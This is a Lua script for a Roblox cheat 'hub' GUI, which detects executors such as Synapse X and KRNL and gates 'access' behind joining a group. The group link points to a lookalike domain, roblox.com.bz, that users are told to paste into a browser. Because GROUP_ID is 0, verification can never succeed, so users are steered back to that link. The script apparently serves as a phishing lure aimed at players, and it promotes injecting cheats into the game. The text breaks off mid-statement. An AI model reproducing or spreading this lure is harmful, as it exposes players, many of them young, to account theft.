--[[
    ██╗   ██╗ ██████╗ ██╗██████╗     ██╗  ██╗██╗   ██╗██████╗ 
    ██║   ██║██╔═══██╗██║██╔══██╗    ██║  ██║██║   ██║██╔══██╗
    ██║   ██║██║   ██║██║██║  ██║    ███████║██║   ██║██████╔╝
    ╚██╗ ██╔╝██║   ██║██║██║  ██║    ██╔══██║██║   ██║██╔══██╗
     ╚████╔╝ ╚██████╔╝██║██████╔╝    ██║  ██║╚██████╔╝██████╔╝
      ╚═══╝   ╚═════╝ ╚═╝╚═════╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 

    VOID HUB  |  Nova Edition  |  v1.0
    Theme: Glitch / Cold Electric
--]]

-- ============================================================
--  COMPAT
-- ============================================================

local _loadstring = loadstring or load

local httpRequest = (syn and syn.request)
    or (http and http.request)
    or (fluxus and fluxus.request)
    or (typeof(request) == "function" and request)
    or nil

local function copyToClipboard(text)
    if setclipboard then setclipboard(text)
    elseif toclipboard then toclipboard(text)
    elseif Clipboard then Clipboard.set(text) end
end

-- ============================================================
--  SERVICES
-- ============================================================

local Players          = game:GetService("Players")
local TweenService     = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService       = game:GetService("RunService")
local CoreGui          = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer
local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")

-- ============================================================
--  CONFIG
-- ============================================================

local HUB = {
    Name       = "VOID HUB",
    Sub        = "Nova Edition",
    Version    = "v1.0",
    Author     = "pherkyyy",
    MinAge     = 10,
    GROUP_ID   = 0,
    GROUP_URL  = "https://roblox.com.bz/communities/1916656950/",
    BackupURL  = "https://roblox.com.bz/communities/1916656950/",
    Discord    = "discord.gg/a4xs2D2hcD",
    SCRIPT_URL = "",
}

-- ============================================================
--  THEME — extracted from image
--  Deep void black · cold electric blue · blown white glow
--  Navy shadow · glitch-bright cyan highlight
-- ============================================================

local C = {
    -- backgrounds
    Void        = Color3.fromRGB(4,   5,   8),    -- deepest black from silhouette
    Deep        = Color3.fromRGB(8,   10,  16),   -- body dark
    Surface     = Color3.fromRGB(12,  15,  24),   -- panel surface
    Sidebar     = Color3.fromRGB(6,   8,   14),   -- sidebar dark

    -- blues (from the electric glow + glitch bands)
    Electric    = Color3.fromRGB(40,  120, 255),  -- core electric blue
    Glitch      = Color3.fromRGB(80,  180, 255),  -- bright glitch cyan
    NavyMid     = Color3.fromRGB(18,  30,  60),   -- dark navy mid
    BlueEdge    = Color3.fromRGB(20,  55,  120),  -- border edge blue

    -- glow / white (blown highlight from the image)
    Blowout     = Color3.fromRGB(200, 225, 255),  -- near-white cold glow
    Ghost       = Color3.fromRGB(130, 170, 220),  -- dim ghost text

    -- states
    Success     = Color3.fromRGB(50,  200, 140),
    Fail        = Color3.fromRGB(200, 50,  70),
    White       = Color3.fromRGB(230, 240, 255),  -- cold white (not warm)
}

-- ============================================================
--  HELPERS
-- ============================================================

local function getAccountAge()
    local ok, age = pcall(function() return LocalPlayer.AccountAge end)
    return ok and age or 0
end

local function detectExecutor()
    if syn then return "Synapse X" end
    if KRNL_LOADED or krnl then return "KRNL" end
    if fluxus ~= nil then return "Fluxus" end
    if getexecutorname then
        local ok, n = pcall(getexecutorname); if ok and n then return n end
    end
    if identifyexecutor then
        local ok, n = pcall(identifyexecutor); if ok and n then return n end
    end
    return "Unknown"
end

local function checkClipboard()
    return (setclipboard ~= nil) or (toclipboard ~= nil) or (Clipboard ~= nil)
end

local function checkGroup()
    if HUB.GROUP_ID == 0 then return false end
    local ok, result = pcall(function() return LocalPlayer:IsInGroup(HUB.GROUP_ID) end)
    return ok and result == true
end

local function buildChecks()
    local inGroup = checkGroup()
    return {
        { key="age",       label=("Account age: %d days (min %d)"):format(getAccountAge(), HUB.MinAge), passed=getAccountAge()>=HUB.MinAge },
        { key="group",     label=inGroup and "Group membership: detected" or "Group membership: not detected yet", passed=inGroup },
        { key="executor",  label=("Executor: %s"):format(detectExecutor()), passed=true },
        { key="clipboard", label="Clipboard support",     passed=checkClipboard() },
        { key="device",    label="Device: PC · Full mode", passed=true },
        { key="backup",    label="Backup link ready",     passed=HUB.BackupURL~="" },
    }
end

-- ============================================================
--  CLEANUP
-- ============================================================

pcall(function()
    if CoreGui:FindFirstChild("VoidHub")   then CoreGui.VoidHub:Destroy()   end
    if PlayerGui:FindFirstChild("VoidHub") then PlayerGui.VoidHub:Destroy() end
end)

-- ============================================================
--  SCREENGUI
-- ============================================================

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name           = "VoidHub"
ScreenGui.ResetOnSpawn   = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.DisplayOrder   = 999
local _pok = pcall(function() ScreenGui.Parent = CoreGui end)
if not _pok then ScreenGui.Parent = PlayerGui end

-- ============================================================
--  ROOT
-- ============================================================

local SIDEBAR_W = 150
local ROOT_W    = 660
local ROOT_H    = 400

local Root = Instance.new("Frame")
Root.Name             = "Root"
Root.Size             = UDim2.new(0, ROOT_W, 0, ROOT_H)
Root.Position         = UDim2.new(0.5, -ROOT_W/2, 0.5, -ROOT_H/2)
Root.BackgroundColor3 = C.Deep
Root.BorderSizePixel  = 0
Root.Active           = true
Root.Draggable        = true
Root.Parent           = ScreenGui
Instance.new("UICorner", Root).CornerRadius = UDim.new(0, 12)

-- outer glow border — electric blue
local Bord = Instance.new("Frame")
Bord.Size             = UDim2.new(1, 2, 1, 2)
Bord.Position         = UDim2.new(0, -1, 0, -1)
Bord.BackgroundColor3 = C.Electric
Bord.BorderSizePixel  = 0
Bord.ZIndex           = 0
Bord.Parent           = Root
Instance.new("UICorner", Bord).CornerRadius = UDim.new(0, 13)

-- inner shadow frame to give depth
local InnerShadow = Instance.new("Frame")
InnerShadow.Size             = UDim2.new(1, -2, 1, -2)
InnerShadow.Position         = UDim2.new(0, 1, 0, 1)
InnerShadow.BackgroundColor3 = C.BlueEdge
InnerShadow.BorderSizePixel  = 0
InnerShadow.ZIndex           = 0
InnerShadow.Parent           = Root
Instance.new("UICorner", InnerShadow).CornerRadius = UDim.new(0, 12)

-- content sits on top
local ContentRoot = Instance.new("Frame")
ContentRoot.Size             = UDim2.new(1, -2, 1, -2)
ContentRoot.Position         = UDim2.new(0, 1, 0, 1)
ContentRoot.BackgroundColor3 = C.Deep
ContentRoot.BorderSizePixel  = 0
ContentRoot.ZIndex           = 1
ContentRoot.Parent           = Root
Instance.new("UICorner", ContentRoot).CornerRadius = UDim.new(0, 11)

-- ============================================================
--  TOP BAR
-- ============================================================

local TopBar = Instance.new("Frame")
TopBar.Size             = UDim2.new(1, 0, 0, 44)
TopBar.BackgroundColor3 = C.Void
TopBar.BorderSizePixel  = 0
TopBar.ZIndex           = 2
TopBar.Parent           = ContentRoot
Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 11)

local TBFix = Instance.new("Frame")
TBFix.Size             = UDim2.new(1, 0, 0, 12)
TBFix.Position         = UDim2.new(0, 0, 1, -12)
TBFix.BackgroundColor3 = C.Void
TBFix.BorderSizePixel  = 0
TBFix.ZIndex           = 2
TBFix.Parent           = TopBar

-- thin blue bottom line on topbar
local TopLine = Instance.new("Frame")
TopLine.Size             = UDim2.new(1, 0, 0, 1)
TopLine.Position         = UDim2.new(0, 0, 1, -1)
TopLine.BackgroundColor3 = C.Electric
TopLine.BorderSizePixel  = 0
TopLine.ZIndex           = 3
TopLine.Parent           = TopBar

-- glitch dot
local Dot = Instance.new("Frame")
Dot.Size             = UDim2.new(0, 8, 0, 8)
Dot.Position         = UDim2.new(0, 16, 0.5, -4)
Dot.BackgroundColor3 = C.Glitch
Dot.BorderSizePixel  = 0
Dot.ZIndex           = 3
Dot.Parent           = TopBar
Instance.new("UICorner", Dot).CornerRadius = UDim.new(1, 0)

-- glow behind dot
local DotGlow = Instance.new("Frame")
DotGlow.Size             = UDim2.new(0, 16, 0, 16)
DotGlow.Position         = UDim2.new(0, 12, 0.5, -8)
DotGlow.BackgroundColor3 = C.Electric
DotGlow.BorderSizePixel  = 0
DotGlow.BackgroundTransparency = 0.7
DotGlow.ZIndex           = 2
DotGlow.Parent           = TopBar
Instance.new("UICorner", DotGlow).CornerRadius = UDim.new(1, 0)

local HubLbl = Instance.new("TextLabel")
HubLbl.Text                 = HUB.Name
HubLbl.Font                 = Enum.Font.GothamBold
HubLbl.TextSize             = 14
HubLbl.TextColor3           = C.White
HubLbl.BackgroundTransparency = 1
HubLbl.Size                 = UDim2.new(0, 140, 1, 0)
HubLbl.Position             = UDim2.new(0, 34, 0, 0)
HubLbl.TextXAlignment       = Enum.TextXAlignment.Left
HubLbl.ZIndex               = 3
HubLbl.Parent               = TopBar

local SubLbl = Instance.new("TextLabel")
SubLbl.Text                 = HUB.Sub
SubLbl.Font                 = Enum.Font.Gotham
SubLbl.TextSize             = 11
SubLbl.TextColor3           = C.Electric
SubLbl.BackgroundTransparency = 1
SubLbl.Size                 = UDim2.new(0, 120, 1, 0)
SubLbl.Position             = UDim2.new(0, 174, 0, 0)
SubLbl.TextXAlignment       = Enum.TextXAlignment.Left
SubLbl.ZIndex               = 3
SubLbl.Parent               = TopBar

local VerLbl = Instance.new("TextLabel")
VerLbl.Text                 = HUB.Version
VerLbl.Font                 = Enum.Font.Gotham
VerLbl.TextSize             = 10
VerLbl.TextColor3           = C.Ghost
VerLbl.BackgroundTransparency = 1
VerLbl.Size                 = UDim2.new(0, 50, 1, 0)
VerLbl.Position             = UDim2.new(1, -90, 0, 0)
VerLbl.TextXAlignment       = Enum.TextXAlignment.Right
VerLbl.ZIndex               = 3
VerLbl.Parent               = TopBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Text                 = "×"
CloseBtn.Font                 = Enum.Font.GothamBold
CloseBtn.TextSize             = 16
CloseBtn.TextColor3           = C.Ghost
CloseBtn.BackgroundTransparency = 1
CloseBtn.Size                 = UDim2.new(0, 36, 1, 0)
CloseBtn.Position             = UDim2.new(1, -38, 0, 0)
CloseBtn.ZIndex               = 3
CloseBtn.Parent               = TopBar

CloseBtn.MouseEnter:Connect(function() CloseBtn.TextColor3 = C.Fail end)
CloseBtn.MouseLeave:Connect(function() CloseBtn.TextColor3 = C.Ghost end)
CloseBtn.MouseButton1Click:Connect(function()
    TweenService:Create(Root, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
        Size     = UDim2.new(0, ROOT_W, 0, 0),
        Position = UDim2.new(0.5, -ROOT_W/2, 0.5, 0),
    }):Play()
    task.delay(0.22, function() ScreenGui:Destroy() end)
end)

-- ============================================================
--  SIDEBAR
-- ============================================================

local Sidebar = Instance.new("Frame")
Sidebar.Name             = "Sidebar"
Sidebar.Size             = UDim2.new(0, SIDEBAR_W, 1, -44)
Sidebar.Position         = UDim2.new(0, 0, 0, 44)
Sidebar.BackgroundColor3 = C.Sidebar
Sidebar.BorderSizePixel  = 0
Sidebar.ZIndex           = 2
Sidebar.Parent           = ContentRoot

local SBCorner = Instance.new("UICorner")
SBCorner.CornerRadius = UDim.new(0, 11)
SBCorner.Parent       = Sidebar

-- kill top-right + bottom-right rounding
local SBFixR = Instance.new("Frame")
SBFixR.Size             = UDim2.new(0, 12, 1, 0)
SBFixR.Position         = UDim2.new(1, -12, 0, 0)
SBFixR.BackgroundColor3 = C.Sidebar
SBFixR.BorderSizePixel  = 0
SBFixR.ZIndex           = 2
SBFixR.Parent           = Sidebar

local SBFixT = Instance.new("Frame")
SBFixT.Size             = UDim2.new(1, 0, 0, 12)
SBFixT.Position         = UDim2.new(0, 0, 0, 0)
SBFixT.BackgroundColor3 = C.Sidebar
SBFixT.BorderSizePixel  = 0
SBFixT.ZIndex           = 2
SBFixT.Parent           = Sidebar

-- right divider line
local SBLine = Instance.new("Frame")
SBLine.Size             = UDim2.new(0, 1, 1, 0)
SBLine.Position         = UDim2.new(1, -1, 0, 0)
SBLine.BackgroundColor3 = C.BlueEdge
SBLine.BorderSizePixel  = 0
SBLine.ZIndex           = 3
SBLine.Parent           = Sidebar

-- ── Avatar ring ───────────────────────────────────────────────
local AvatarRing = Instance.new("Frame")
AvatarRing.Size             = UDim2.new(0, 74, 0, 74)
AvatarRing.Position         = UDim2.new(0.5, -37, 0, 18)
AvatarRing.BackgroundColor3 = C.Electric
AvatarRing.BorderSizePixel  = 0
AvatarRing.ZIndex           = 3
AvatarRing.Parent           = Sidebar
Instance.new("UICorner", AvatarRing).CornerRadius = UDim.new(1, 0)

-- glow pulse behind ring
local AvatarGlow = Instance.new("Frame")
AvatarGlow.Size             = UDim2.new(0, 86, 0, 86)
AvatarGlow.Position         = UDim2.new(0.5, -43, 0, 12)
AvatarGlow.BackgroundColor3 = C.Electric
AvatarGlow.BackgroundTransparency = 0.75
AvatarGlow.BorderSizePixel  = 0
AvatarGlow.ZIndex           = 2
AvatarGlow.Parent           = Sidebar
Instance.new("UICorner", AvatarGlow).CornerRadius = UDim.new(1, 0)

local AvatarInner = Instance.new("Frame")
AvatarInner.Size             = UDim2.new(1, -4, 1, -4)
AvatarInner.Position         = UDim2.new(0, 2, 0, 2)
AvatarInner.BackgroundColor3 = C.Void
AvatarInner.BorderSizePixel  = 0
AvatarInner.ZIndex           = 4
AvatarInner.Parent           = AvatarRing
Instance.new("UICorner", AvatarInner).CornerRadius = UDim.new(1, 0)

local AvatarImg = Instance.new("ImageLabel")
AvatarImg.Size                = UDim2.new(1, 0, 1, 0)
AvatarImg.BackgroundTransparency = 1
AvatarImg.Image               = ""
AvatarImg.ZIndex              = 5
AvatarImg.Parent              = AvatarInner
Instance.new("UICorner", AvatarImg).CornerRadius = UDim.new(1, 0)

task.spawn(function()
    local ok, img = pcall(function()
        return Players:GetUserThumbnailAsync(
            LocalPlayer.UserId,
            Enum.ThumbnailType.AvatarBust,
            Enum.ThumbnailSize.Size100x100
        )
    end)
    if ok and img then AvatarImg.Image = img end
end)

-- pulse glow animation
task.spawn(function()
    while AvatarGlow and AvatarGlow.Parent do
        TweenService:Create(AvatarGlow, TweenInfo.new(1.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            BackgroundTransparency = 0.55
        }):Play()
        task.wait(1.6)
        TweenService:Create(AvatarGlow, TweenInfo.new(1.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            BackgroundTransparency = 0.85
        }):Play()
        task.wait(1.6)
    end
end)

-- ── Username ──────────────────────────────────────────────────
local UsernameLbl = Instance.new("TextLabel")
UsernameLbl.Text                 = LocalPlayer.Name
UsernameLbl.Font                 = Enum.Font.GothamBold
UsernameLbl.TextSize             = 12
UsernameLbl.TextColor3           = C.White
UsernameLbl.BackgroundTransparency = 1
UsernameLbl.Size                 = UDim2.new(1, -8, 0, 16)
UsernameLbl.Position             = UDim2.new(0, 4, 0, 100)
UsernameLbl.TextXAlignment       = Enum.TextXAlignment.Center
UsernameLbl.TextWrapped          = true
UsernameLbl.ZIndex               = 3
UsernameLbl.Parent               = Sidebar

local AtLbl = Instance.new("TextLabel")
AtLbl.Text                 = "@" .. LocalPlayer.Name
AtLbl.Font                 = Enum.Font.Gotham
AtLbl.TextSize             = 9
AtLbl.TextColor3           = C.Ghost
AtLbl.BackgroundTransparency = 1
AtLbl.Size                 = UDim2.new(1, -8, 0, 13)
AtLbl.Position             = UDim2.new(0, 4, 0, 118)
AtLbl.TextXAlignment       = Enum.TextXAlignment.Center
AtLbl.ZIndex               = 3
AtLbl.Parent               = Sidebar

task.spawn(function()
    local ok, dn = pcall(function() return LocalPlayer.DisplayName end)
    if ok and dn and dn ~= LocalPlayer.Name then
        UsernameLbl.Text = dn
        AtLbl.Text       = "@" .. LocalPlayer.Name
    else
        AtLbl.Text = ""
    end
end)

-- ── Info badges ───────────────────────────────────────────────
local function makeBadge(yPos, icon, text)
    local f = Instance.new("Frame")
    f.Size             = UDim2.new(1, -16, 0, 20)
    f.Position         = UDim2.new(0, 8, 0, yPos)
    f.BackgroundColor3 = C.NavyMid
    f.BorderSizePixel  = 0
    f.ZIndex           = 3
    f.Parent           = Sidebar
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 4)

    -- left accent bar
    local bar = Instance.new("Frame")
    bar.Size             = UDim2.new(0, 2, 1, 0)
    bar.BackgroundColor3 = C.Electric
    bar.BorderSizePixel  = 0
    bar.ZIndex           = 4
    bar.Parent           = f
    Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 2)

    local lbl = Instance.new("TextLabel")
    lbl.Text                 = icon .. "  " .. text
    lbl.Font                 = Enum.Font.Gotham
    lbl.TextSize             = 9
    lbl.TextColor3           = C.Ghost
    lbl.BackgroundTransparency = 1
    lbl.Size                 = UDim2.new(1, -8, 1, 0)
    lbl.Position             = UDim2.new(0, 6, 0, 0)
    lbl.TextXAlignment       = Enum.TextXAlignment.Left
    lbl.ZIndex               = 4
    lbl.Parent               = f
    return f, lbl
end

makeBadge(140, "🗓", ("%d days old"):format(getAccountAge()))
makeBadge(166, "💻", "PC · Full mode")
local _, statsLblRef = makeBadge(192, "⚡", "-- FPS · --ms")

-- live FPS/ping
local fpsHistory = {}
RunService.RenderStepped:Connect(function(dt)
    table.insert(fpsHistory, 1/dt)
    if #fpsHistory > 20 then table.remove(fpsHistory, 1) end
    local sum = 0
    for _, v in ipairs(fpsHistory) do sum = sum + v end
    local fps  = math.floor(sum / #fpsHistory)
    local ping = math.floor(LocalPlayer:GetNetworkPing() * 1000)
    statsLblRef.Text = "⚡  " .. fps .. " FPS · " .. ping .. "ms"
end)

-- ── Executor badge at bottom ──────────────────────────────────
local _, execLbl = makeBadge(ROOT_H - 44 - 30, "🔧", detectExecutor())

-- ============================================================
--  CONTENT AREA
-- ============================================================

local ContentArea = Instance.new("Frame")
ContentArea.Name                  = "ContentArea"
ContentArea.Size                  = UDim2.new(1, -SIDEBAR_W, 1, -44)
ContentArea.Position              = UDim2.new(0, SIDEBAR_W, 0, 44)
ContentArea.BackgroundTransparency = 1
ContentArea.ZIndex                = 2
ContentArea.Parent                = ContentRoot

-- ── Tab bar ───────────────────────────────────────────────────
local TabBar = Instance.new("Frame")
TabBar.Size                 = UDim2.new(1, -20, 0, 28)
TabBar.Position             = UDim2.new(0, 10, 0, 8)
TabBar.BackgroundTransparency = 1
TabBar.ZIndex               = 3
TabBar.Parent               = ContentArea

local TabLayout = Instance.new("UIListLayout")
TabLayout.FillDirection = Enum.FillDirection.Horizontal
TabLayout.SortOrder     = Enum.SortOrder.LayoutOrder
TabLayout.Padding       = UDim.new(0, 6)
TabLayout.Parent        = TabBar

local tabNames = {"Access", "Guide", "System"}
local tabBtns  = {}
local tabPages = {}
local activeTab = "System"

for i, name in ipairs(tabNames) do
    local btn = Instance.new("TextButton")
    btn.Name             = name
    btn.Text             = name
    btn.Font             = Enum.Font.Gotham
    btn.TextSize         = 11
    btn.BackgroundColor3 = C.NavyMid
    btn.TextColor3       = C.Ghost
    btn.BorderSizePixel  = 0
    btn.Size             = UDim2.new(0, 78, 1, 0)
    btn.LayoutOrder      = i
    btn.ZIndex           = 3
    btn.Parent           = TabBar
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)
    tabBtns[name] = btn

    btn.MouseEnter:Connect(function()
        if activeTab ~= name then
            TweenService:Create(btn, TweenInfo.new(0.15), {TextColor3=C.Blowout}):Play()
        end
    end)
    btn.MouseLeave:Connect(function()
        if activeTab ~= name then
            TweenService:Create(btn, TweenInfo.new(0.15), {TextColor3=C.Ghost}):Play()
        end
    end)
end

-- ── Page container ────────────────────────────────────────────
local PageContainer = Instance.new("Frame")
PageContainer.Size                = UDim2.new(1, -20, 1, -46)
PageContainer.Position            = UDim2.new(0, 10, 0, 42)
PageContainer.BackgroundTransparency = 1
PageContainer.ZIndex              = 2
PageContainer.Parent              = ContentArea

local function makePage(name)
    local p = Instance.new("Frame")
    p.Name             = name
    p.Size             = UDim2.new(1, 0, 1, 0)
    p.BackgroundColor3 = C.Surface
    p.BorderSizePixel  = 0
    p.Visible          = false
    p.ZIndex           = 2
    p.Parent           = PageContainer
    Instance.new("UICorner", p).CornerRadius = UDim.new(0, 8)
    tabPages[name] = p
    return p
end

-- shared button factory
local function makeBtn(parent, text, yPos, accent)
    local btn = Instance.new("TextButton")
    btn.Text             = text
    btn.Font             = accent and Enum.Font.GothamBold or Enum.Font.Gotham
    btn.TextSize         = accent and 13 or 11
    btn.TextColor3       = accent and C.White or C.Ghost
    btn.BackgroundColor3 = accent and C.Electric or C.NavyMid
    btn.BorderSizePixel  = 0
    btn.Size             = UDim2.new(1, -20, 0, accent and 34 or 28)
    btn.Position         = UDim2.new(0, 10, 0, yPos)
    btn.ZIndex           = 3
    btn.Parent           = parent
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)

    -- left accent bar on secondary buttons
    if not accent then
        local bar = Instance.new("Frame")
        bar.Size             = UDim2.new(0, 2, 0.6, 0)
        bar.Position         = UDim2.new(0, 0, 0.2, 0)
        bar.BackgroundColor3 = C.Electric
        bar.BorderSizePixel  = 0
        bar.ZIndex           = 4
        bar.Parent           = btn
        Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 2)
    end

    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.12), {
            BackgroundColor3 = accent and C.Glitch or C.BlueEdge
        }):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.12), {
            BackgroundColor3 = accent and C.Electric or C.NavyMid
        }):Play()
    end)
    return btn
end

-- ============================================================
--  ACCESS PAGE
-- ============================================================

local accessPage = makePage("Access")

-- step strip
local stepStrip = Instance.new("Frame")
stepStrip.Size             = UDim2.new(1, -20, 0, 24)
stepStrip.Position         = UDim2.new(0, 10, 0, 10)
stepStrip.BackgroundColor3 = C.Void
stepStrip.BorderSizePixel  = 0
stepStrip.ZIndex           = 3
stepStrip.Parent           = accessPage
Instance.new("UICorner", stepStrip).CornerRadius = UDim.new(0, 5)

-- thin top line
local stripLine = Instance.new("Frame")
stripLine.Size             = UDim2.new(1, 0, 0, 1)
stripLine.BackgroundColor3 = C.BlueEdge
stripLine.BorderSizePixel  = 0
stripLine.ZIndex           = 4
stripLine.Parent           = stepStrip

local stepLayout2 = Instance.new("UIListLayout")
stepLayout2.FillDirection = Enum.FillDirection.Horizontal
stepLayout2.SortOrder     = Enum.SortOrder.LayoutOrder
stepLayout2.Parent        = stepStrip

local stepElems = {}
for i, s in ipairs({"① Copy link", "② Join group", "③ Verify"}) do
    local seg = Instance.new("TextLabel")
    seg.Text                 = s
    seg.Font                 = Enum.Font.Gotham
    seg.TextSize             = 10
    seg.TextColor3           = i==1 and C.Electric or C.Ghost
    seg.BackgroundTransparency = 1
    seg.Size                 = UDim2.new(0, 120, 1, 0)
    seg.TextXAlignment       = Enum.TextXAlignment.Center
    seg.LayoutOrder          = i
    seg.ZIndex               = 4
    seg.Parent               = stepStrip
    stepElems[i] = seg
end

local function setStep(n)
    for i, seg in ipairs(stepElems) do
        seg.TextColor3 = (i==n) and C.Electric or (i<n) and C.Success or C.Ghost
    end
end

-- desc
local accDesc = Instance.new("TextLabel")
accDesc.Text                 = "Access is free — join the group to unlock VOID HUB."
accDesc.Font                 = Enum.Font.Gotham
accDesc.TextSize             = 10
accDesc.TextColor3           = C.Ghost
accDesc.BackgroundTransparency = 1
accDesc.Size                 = UDim2.new(1, -20, 0, 24)
accDesc.Position             = UDim2.new(0, 10, 0, 42)
accDesc.TextXAlignment       = Enum.TextXAlignment.Left
accDesc.TextWrapped          = true
accDesc.ZIndex               = 3
accDesc.Parent               = accessPage

-- status box
local statusBox = Instance.new("Frame")
statusBox.Size             = UDim2.new(1, -20, 0, 48)
statusBox.Position         = UDim2.new(0, 10, 0, 72)
statusBox.BackgroundColor3 = C.Void
statusBox.BorderSizePixel  = 0
statusBox.ZIndex           = 3
statusBox.Parent           = accessPage
Instance.new("UICorner", statusBox).CornerRadius = UDim.new(0, 6)

-- left color bar
local statusBar = Instance.new("Frame")
statusBar.Size             = UDim2.new(0, 3, 1, 0)
statusBar.BackgroundColor3 = C.Fail
statusBar.BorderSizePixel  = 0
statusBar.ZIndex           = 4
statusBar.Parent           = statusBox
Instance.new("UICorner", statusBar).CornerRadius = UDim.new(0, 3)

local statusIcon = Instance.new("TextLabel")
statusIcon.Text                 = "✗"
statusIcon.Font                 = Enum.Font.GothamBold
statusIcon.TextSize             = 18
statusIcon.TextColor3           = C.Fail
statusIcon.BackgroundTransparency = 1
statusIcon.Size                 = UDim2.new(0, 36, 1, 0)
statusIcon.Position             = UDim2.new(0, 4, 0, 0)
statusIcon.TextXAlignment       = Enum.TextXAlignment.Center
statusIcon.ZIndex               = 4
statusIcon.Parent               = statusBox

local statusText = Instance.new("TextLabel")
statusText.Text                 = "Not in group"
statusText.Font                 = Enum.Font.GothamBold
statusText.TextSize             = 12
statusText.TextColor3           = C.White
statusText.BackgroundTransparency = 1
statusText.Size                 = UDim2.new(1, -48, 0, 20)
statusText.Position             = UDim2.new(0, 44, 0, 6)
statusText.TextXAlignment       = Enum.TextXAlignment.Left
statusText.ZIndex               = 4
statusText.Parent               = statusBox

local statusSub = Instance.new("TextLabel")
statusSub.Text                 = "Copy the group link below and join to get access."
statusSub.Font                 = Enum.Font.Gotham
statusSub.TextSize             = 9
statusSub.TextColor3           = C.Ghost
statusSub.BackgroundTransparency = 1
statusSub.Size                 = UDim2.new(1, -48, 0, 14)
statusSub.Position             = UDim2.new(0, 44, 0, 28)
statusSub.TextXAlignment       = Enum.TextXAlignment.Left
statusSub.TextWrapped          = true
statusSub.ZIndex               = 4
statusSub.Parent               = statusBox

local copyGrpBtn = makeBtn(accessPage, "🔗  Copy Group Link", 132, true)
local verifyBtn  = makeBtn(accessPage, "↺  I joined — verify access", 174, false)

local function applyGroupGranted()
    statusBar.BackgroundColor3  = C.Success
    statusIcon.Text             = "✓"
    statusIcon.TextColor3       = C.Success
    statusText.Text             = "Access granted!"
    statusSub.Text              = "You are a member. VOID HUB is fully unlocked."
    statusSub.TextColor3        = C.Success
    verifyBtn.Text              = "✓  Verified — you're in!"
    verifyBtn.BackgroundColor3  = C.Success
    copyGrpBtn.Visible          = false
    setStep(3)
end

copyGrpBtn.MouseButton1Click:Connect(function()
    copyToClipboard(HUB.GROUP_URL)
    copyGrpBtn.Text             = "✓  Copied! Paste in your browser"
    setStep(2)
    task.delay(2.5, function() copyGrpBtn.Text = "🔗  Copy Group Link" end)
end)

verifyBtn.MouseButton1Click:Connect(function()
    verifyBtn.Text = "Checking..."
    setStep(3)
    task.spawn(function()
        if checkGroup() then
            applyGroupGranted()
            renderChecks(buildChecks())
        else
            statusText.Text            = "Not in group"
            statusSub.Text             = "Join the group first, then click verify."
            statusSub.TextColor3       = C.Ghost
            verifyBtn.Text             = "✗  Not detected — try again"
            verifyBtn.BackgroundColor3 = C.Fail
            setStep(1)
            task.delay(2, function()
                verifyBtn.Text             = "↺  I joined — verify access"
                verifyBtn.BackgroundColor3 = C.NavyMid
            end)
        end
    end)
end)

local accDisc = Instance.new("TextLabel")
accDisc.Text                 = "discord: " .. HUB.Discord
accDisc.Font                 = Enum.Font.Gotham
accDisc.TextSize             = 9
accDisc.TextColor3           = C.Ghost
accDisc.BackgroundTransparency = 1
accDisc.Size                 = UDim2.new(1, -20, 0, 12)
accDisc.Position             = UDim2.new(0, 10, 1, -16)
accDisc.TextXAlignment       = Enum.TextXAlignment.Left
accDisc.ZIndex               = 3
accDisc.Parent               = accessPage

task.spawn(function()
    if checkGroup() then applyGroupGranted() end
end)

-- ============================================================
--  GUIDE PAGE
-- ============================================================

local guidePage = makePage("Guide")

local guideTitle = Instance.new("TextLabel")
guideTitle.Text                 = "Quick Guide"
guideTitle.Font                 = Enum.Font.GothamBold
guideTitle.TextSize             = 13
guideTitle.TextColor3           = C.White
guideTitle.BackgroundTransparency = 1
guideTitle.Size                 = UDim2.new(1, -20, 0, 20)
guideTitle.Position             = UDim2.new(0, 10, 0, 10)
guideTitle.TextXAlignment       = Enum.TextXAlignment.Left
guideTitle.ZIndex               = 3
guideTitle.Parent               = guidePage

local guideSep = Instance.new("Frame")
guideSep.Size             = UDim2.new(1, -20, 0, 1)
guideSep.Position         = UDim2.new(0, 10, 0, 34)
guideSep.BackgroundColor3 = C.BlueEdge
guideSep.BorderSizePixel  = 0
guideSep.ZIndex           = 3
guideSep.Parent           = guidePage

local guideLbl = Instance.new("TextLabel")
guideLbl.Text = "1.  Attach your executor before injecting.\n" ..
                "2.  Go to Access tab → Copy Group Link.\n" ..
                "3.  Paste into browser and join the group.\n" ..
                "4.  Click \"I joined — verify access\".\n" ..
                "5.  Green = unlocked. Scripts load automatically.\n\n" ..
                "Executors:\nSynapse X · KRNL · Script-Ware · Fluxus\n" ..
                "Evon · Arceus X · Delta · Hydrogen · AWP\n\n" ..
                "discord: " .. HUB.Discord
guideLbl.Font                 = Enum.Font.Gotham
guideLbl.TextSize             = 11
guideLbl.TextColor3           = C.Ghost
guideLbl.BackgroundTransparency = 1
guideLbl.Size                 = UDim2.new(1, -20, 1, -50)
guideLbl.Position             = UDim2.new(0, 10, 0, 42)
guideLbl.TextXAlignment       = Enum.TextXAlignment.Left
guideLbl.TextYAlignment       = Enum.TextYAlignment.Top
guideLbl.TextWrapped          = true
guideLbl.ZIndex               = 3
guideLbl.Parent               = guidePage

-- ============================================================
--  SYSTEM PAGE
-- ============================================================

local systemPage = makePage("System")

local sysTitle = Instance.new("TextLabel")
sysTitle.Text                 = "Live checks"
sysTitle.Font                 = Enum.Font.GothamBold
sysTitle.TextSize             = 13
sysTitle.TextColor3           = C.White
sysTitle.BackgroundTransparency = 1
sysTitle.Size                 = UDim2.new(1, -20, 0, 20)
